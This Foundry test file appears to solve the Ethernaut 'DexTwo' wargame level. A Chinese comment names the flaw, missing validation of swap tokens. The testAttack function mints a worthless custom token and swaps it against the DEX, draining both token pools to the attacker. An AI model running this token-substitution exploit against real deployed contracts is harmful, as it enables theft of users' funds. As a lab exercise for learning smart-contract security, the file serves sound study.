// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {DexTwo, SwappableTokenTwo} from "../src/DexTwo.sol";
import {ERC20} from "@openzeppelin8/contracts/token/ERC20/ERC20.sol";

/* 
漏洞原理 
没有校验 swap token
*/

contract TestToken is ERC20 {
    address private _dex;

    constructor(string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
    }
}

contract DexTwoTest is Test {
    DexTwo public dexTwo;
    SwappableTokenTwo token1;
    SwappableTokenTwo token2;
    ERC20 token3;

    address alice = makeAddr("alice");

    function setUp() public {
        dexTwo = new DexTwo();
        token1 = new SwappableTokenTwo(address(dexTwo), "tokenA", "tokenA", 1000000);
        token2 = new SwappableTokenTwo(address(dexTwo), "tokenB", "tokenB", 1000000);
        dexTwo.setTokens(address(token1), address(token2));

        token1.transfer(alice, 10);
        token2.transfer(alice, 10);

        dexTwo.approve(address(dexTwo), 100);
        dexTwo.add_liquidity(address(token1), 100);
        dexTwo.add_liquidity(address(token2), 100);
    }

    function testAttack() public {
        assertEq(token1.balanceOf(address(dexTwo)), 100);
        assertEq(token2.balanceOf(address(dexTwo)), 100);
        assertEq(token1.balanceOf(alice), 10);
        assertEq(token2.balanceOf(alice), 10);

        vm.startPrank(alice);

        token3 = new TestToken("tokenC", "tokenC", 1000);
        token3.approve(address(dexTwo), 1000);
        token3.transfer(address(dexTwo), 100);

        dexTwo.swap(address(token3), address(token1), 100);
        dexTwo.swap(address(token3), address(token2), 200);

        vm.stopPrank();

        assertEq(token1.balanceOf(address(dexTwo)), 0);
        assertEq(token2.balanceOf(address(dexTwo)), 0);
        assertEq(token1.balanceOf(alice), 110);
        assertEq(token2.balanceOf(alice), 110);
    }
}
